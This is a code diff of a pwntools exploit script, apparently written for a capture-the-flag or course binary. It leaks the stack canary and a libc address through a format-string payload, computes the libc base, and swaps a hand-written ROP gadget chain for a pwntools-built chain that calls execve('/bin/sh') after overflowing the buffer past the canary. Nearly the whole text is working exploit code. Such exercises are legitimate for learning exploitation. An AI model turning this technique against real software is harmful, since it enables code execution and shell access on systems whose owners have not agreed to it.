@@ -24,65 +24,30 @@ def start(argv=[], *a, **kw):
 # you can also create new functions here
 
 def main():
-    list = ['%17$p%19$p']
+    list = ['%17$p.%19$p.%21$p'] # 17 da dort canary, 18 ist saved rbp, 19 ist ret
+    libc = exe.libc
 
     io = start(list)
 
     # add your exploit code here
-    leak = io.recv()
-    canary = leak[0:18]
-    libc_base_address = leak[18:-1]
-    print(canary)
-    print(libc_base_address)
-    
-    offset = b'1eb000'
-    libc_rw_address = hex(int(libc_base_address, 16) + int(offset, 16))
-    print(libc_rw_address)
+    addresses = io.recvline(timeout=0.5)
 
-    bytes_until_ret = 64
+    canary = p64(int(addresses[0:18], 16))
+    libc.address = int(addresses[19:33], 16) - libc.sym["__libc_start_call_main"] - 128
+    #exe.address = int(addresses[34:-1], 16) - exe.sym["main"]
 
-    sys_write = 1
-    sys_exit = 60
-    stdout = 1
-    exit_code = 0
+    print(hex(exe.address))
 
-    command = b"/bin/sh\x00"
+    print(hex(libc.address))
 
-    payload = b"A" * bytes_until_ret
+    r = ROP(libc) # Problem: Base needed so bin/sh works...
+    r.call('execve', ['/bin/sh\x00'])
 
-    gadget_mov = p64(int(libc_base_address, 16) + 0x2e19c)
-    gadget_pop_rax = p64(int(libc_base_address, 16) + 0x33544)
-    gadget_pop_rdi = p64(int(libc_base_address, 16) + 0x21102)
-    gadget_pop_rsi = p64(int(libc_base_address, 16) + 0x202e8)
-    gadget_pop_rdx = p64(int(libc_base_address, 16) + 0x1b92)
-    gadget_sysenter = p64(int(libc_base_address, 16) + 0xbc375)
+    payload = b""   
+    payload += cyclic(72) + canary
+    payload += r.chain()
 
-    payload += p64(int(canary, 16), endian = "big")
-    payload += p64(int(canary, 16) + 0x28, endian = "big")
-    payload += gadget_pop_rdx
-    payload += p64(int(libc_rw_address, 16))
-    payload += gadget_pop_rax
-    payload += command
-    payload += gadget_mov
-
-    # prepare registers
-    payload += gadget_pop_rax
-    payload += p64(59)
-    payload += gadget_pop_rdi
-    payload += command
-    payload += gadget_pop_rsi
-    payload += p64(0)
-    payload += gadget_pop_rdx
-    payload += p64(0)
-
-    payload += gadget_pop_rdi
-    payload += p64(exit_code)
-    payload += gadget_pop_rax
-    payload += p64(sys_exit)
-
-    payload += gadget_sysenter
-
-    print(payload)
+    print(r.dump())
 
     io.sendline(payload)
 
